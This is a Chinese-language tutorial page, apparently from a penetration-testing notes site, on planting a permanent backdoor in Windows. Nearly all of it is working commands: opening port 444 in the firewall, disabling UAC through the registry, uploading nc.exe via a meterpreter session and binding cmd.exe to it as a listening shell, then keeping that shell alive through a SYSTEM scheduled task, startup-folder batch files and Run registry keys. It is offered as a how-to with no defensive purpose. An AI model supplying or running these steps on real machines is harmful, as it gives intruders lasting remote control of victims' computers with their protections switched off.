---
layout: default
title: 给Windows植入永久后门
---

# 通过cmd控制Windows防火墙

## Windows防火墙咋回事？

> * windows 的网络有三种类型：私有（家庭）、域（工作）、公共
> 
> * 每种网络类型对应一个防火墙配置：私有配置、域配置、公共配置
> 
> * 我的网络是公共网络，用的是公共防火墙配置
> 
> * 网卡网络只属于某一种类型，也就是说只有一种防火墙配置在生效
> 
> * 设置网络类型：控制面板》网络和共享中心
> 
> * 或者：设置》网络和Internet

## 精准控制防火墙

```batch
netsh advfirewall show currentprofile
rem 查看当前网络是什么类型的
rem 查看当前网络防火墙打开还是关闭
netsh advfirewall set privateprofile state on
netsh advfirewall set privateprofile state off
netsh advfirewall set domainprofile state on
netsh advfirewall set domainprofile state off
netsh advfirewall set publicprofile state on
netsh advfirewall set publicprofile state off
rem 开闭私有、域、公共防火墙
rem 要么直接关闭了，不过动作太大
netsh advfirewall firewall show rule profile=public name=all
rem 查看public防火墙所有规则
rem Rule Name:                            backdoor
rem -----------------------------------------------------------
rem Enabled:                              Yes
rem Direction:                            In
rem Profiles:                             Public
rem Grouping:                             
rem LocalIP:                              Any
rem RemoteIP:                             Any
rem Protocol:                             TCP
rem LocalPort:                            444
rem RemotePort:                           Any
rem Edge traversal: (边缘穿越)             No
rem Action:                               Allow
netsh advfirewall firewall add rule profile=public name="backdoor" dir=in action=allow protocol=TCP localport=444
rem 添加放行规则
netsh advfirewall firewall show rule profile=public name="backdoor"
rem 查看这条规则
netsh advfirewall firewall delete rule profile=public name="backdoor"
rem 删除规则
```

## 控制全部类型防火墙

```batch
netsh advfirewall show allprofiles 
rem 查看所有防火墙状态
netsh advfirewall set allprofiles state on
netsh advfirewall set allprofiles state off
rem 开闭所有防火墙
rem 动作太大
netsh advfirewall firewall show rule name=all
rem 查看所有规则
netsh advfirewall firewall add rule name="backdoor" dir=in action=allow protocol=TCP localport=444
rem 添加放行规则
netsh advfirewall firewall show rule name="backdoor"
rem 查看这条规则
netsh advfirewall firewall delete rule name="backdoor"
rem 删除规则
```

# 通过cmd关闭UAC

## UAC是啥？

> * UAC user account control 用户账户控制
> 
> * 控制面板》用户账户》用户账户控制

## 关闭UAC

```batch
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
rem 关闭UAC
rem 通过修改注册表项
rem 注册表是Windows系统的配置文件，系统开机时自动加载注册表配置
rem value 键值EnableLUA 使能limited user account
rem type REG_DWORD
rem date 0
rem force
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
rem 查询UAC注册表
```

# 上传nc后门

## nc是啥？

> * 利用nc工具，nc工具本来是网络调试的
> 
> * 功能强，体积小巧，常用于木马
> 
> * nc像telnet、ssh一样，能反弹shell
> 
> * 新版nc是nmap的一个子工具
> 
> * nc和ncat一样

## 上传nc

```bash
upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32\\
# \\是\的转义字符，目标路径为c:\windows\system32\nc.exe
```

# nc连接测试-远端服务

## 启动nc

```batch
start /min "" c:\windows\system32\nc.exe -Ldp 444 -e cmd.exe
netstat /an
rem 验证nc是否启动
rem 最小化启动进程
rem ""标题为空
rem c:\windows\system32\nc.exe 启动nc进程
rem 后边是参数
rem L listening监听，d detach分离也就是后台运行，p port端口444
rem nc把cmd反弹回来
rem 或者
rem c:\windows\system32\nc.exe -Ldp 444 -e cmd.exe
rem 这样当前cmd会卡在nc监听，连接成功后才会退出
```

## 连接nc

```bash
# 使用Kali普通zsh
nc 172.20.0.7 444
```

# 设置nc开机自启

## 通过任务计划程序

```batch
schtasks /create /tn "nc" /ru system /tr "c:\windows\system32\nc.exe -Ldp 444 -e cmd.exe" /sc onstart /f
rem schtasks 计划任务
rem tn task name
rem ru run user
rem tr task run
rem sc schedule
rem f force
schtasks /query /tn "nc"
rem cmd命令查询计划任务
rem 图形化界面查询计划任务：控制面板》管理工具》任务计划程序
schtasks /delete /tn "nc" /f
rem 删除计划任务
```

## 通过启动目录

### 理论

> * 启动目录分用户启动目录和系统启动目录
> 
> * 查看用户启动目录：运行》shell:startup
> 
> * 查看系统启动目录：运行》shell:common startup
> 
> * winxp、03启动目录自己一个样
> 
> * 用户启动目录：%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
> 
> * 系统启动目录：%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\

### 写到系统启动目录

```batch
cd %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\
echo start /min "" c:\windows\system32\nc.exe -Ldp 444 -e cmd.exe > backdoor.bat
echo exit >> backdoor.bat
rem Windows和Linux >是覆写，>>是追加
type backdoor.bat
rem type在cmd是查看文件内容，在bash是查询命令类型
del backdoor.bat
rem 删除bat脚本
```

### 写道用户启动目录

```batch
cd %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
echo start /min "" c:\windows\system32\nc.exe -Ldp 444 -e cmd.exe > backdoor.bat
echo exit >> backdoor.bat
rem system权限的cmd找不到用户启动目录，把meterpreter进程迁移到administrator权限的进程下，再启动cmdshell，用administrator权限的cmd
type backdoor.bat
del backdoor.bat
```

## 通过修改注册表的启动项

### 理论

> * 注册表就是系统配置文件
> 
> * 系统启动时，加载注册表配置
> 
> * 注册表里有一项“启动项”，规定了系统启动时的动作

### 修改当前用户注册表启动项

```batch
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "c:\windows\system32\nc.exe -Ldp 444 -e cmd.exe" /f
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /f
```

### 修改系统的注册表启动项

```batch
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "c:\windows\system32\nc.exe -Ldp 444 -e cmd.exe" /f
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor
reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /f
```
